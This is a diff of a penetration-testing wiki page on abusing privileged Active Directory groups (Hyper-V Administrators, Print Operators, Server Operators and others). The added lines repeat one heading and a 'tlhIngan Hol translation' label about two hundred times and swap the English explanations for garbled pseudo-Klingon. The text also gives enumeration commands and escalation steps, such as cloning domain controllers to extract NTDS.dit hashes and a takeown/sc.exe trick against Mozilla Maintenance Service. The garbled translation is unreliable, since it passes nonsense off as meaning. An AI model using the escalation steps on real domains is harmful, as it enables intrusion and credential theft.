+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation:**
+## Exchange Windows Permissions
+**tlhIngan Hol translation:**
+### Exchange Windows Permissions
+**tlhIngan Hol translation
 ```powershell
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
-
 ## Hyper-V Administrators
-Hyper-V Administrators have full access to Hyper-V, which can be exploited to gain control over virtualized Domain Controllers. This includes cloning live DCs and extracting NTLM hashes from the NTDS.dit file.
+Hyper-V Administrators jup 'ej Hyper-V, vaj vItlhutlhlaHbe'lu'chugh virtualized Domain Controllers control ghom. vaj 'ej NTDS.dit file NTLM hashes cha'logh cloning live DCs 'ej extracting.
 
 ### Exploitation Example
-Firefox's Mozilla Maintenance Service can be exploited by Hyper-V Administrators to execute commands as SYSTEM. This involves creating a hard link to a protected SYSTEM file and replacing it with a malicious executable:
-
+Firefox's Mozilla Maintenance Service Hyper-V Administrators 'ej SYSTEM vItlhutlhlaHbe'lu'chugh commands execute. vaj 'ej malicious executable replace 'ej protected SYSTEM file hard link creating involves:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 sc.exe start MozillaMaintenance
 ```
-
 Note: Hard link exploitation has been mitigated in recent Windows updates.
 
 ## Organization Management
@@ -255,41 +797,31 @@ In environments where **Microsoft Exchange** is deployed, a special group known 
 Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.
 
 To list the members of this group, the following PowerShell command is used:
-
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
-
-For more detailed exploitation techniques related to **`SeLoadDriverPrivilege`**, one should consult specific security resources.
-
-#### Remote Desktop Users
-This group's members are granted access to PCs via Remote Desktop Protocol (RDP). To enumerate these members, PowerShell commands are available:
-
+### **`SeLoadDriverPrivilege`** qorwagh exploitation techniques laHlIj yIlo'laHbe'chugh **ghItlh**. **Remote Desktop Users**:
+**Remote Desktop Users** ghoS members RDP (Remote Desktop Protocol) lo'laHbe'chugh PCmey. **PowerShell** commands yuQjIjDI'wI'pu'chugh members vItlhutlh:
 ```powershell
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
-
-Further insights into exploiting RDP can be found in dedicated pentesting resources.
-
 #### Remote Management Users
 Members can access PCs over **Windows Remote Management (WinRM)**. Enumeration of these members is achieved through:
 
+#### qo'noS Qapla'wI' 
+Qapla'wI' je members PCs **Windows Remote Management (WinRM)**. Enumeration of these members is achieved through:
 ```powershell
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
-
-For exploitation techniques related to **WinRM**, specific documentation should be consulted.
+**WinRM**-laH vItlhutlhlaHbe'chugh exploitation techniques vItlhutlhlaHbe'chugh **documentation**-nISbej.
 
 #### Server Operators
-This group has permissions to perform various configurations on Domain Controllers, including backup and restore privileges, changing system time, and shutting down the system. To enumerate the members, the command provided is:
-
+qaStaHvIS Domain Controllers Daq yIlo'laHbe'chugh, backup je restore privileges, system time je system yIqem. qaStaHvIS members vItlhutlhlaHbe'chugh, command vItlhutlhlaH:
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
-
-
 ## References <a href="#references" id="references"></a>
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
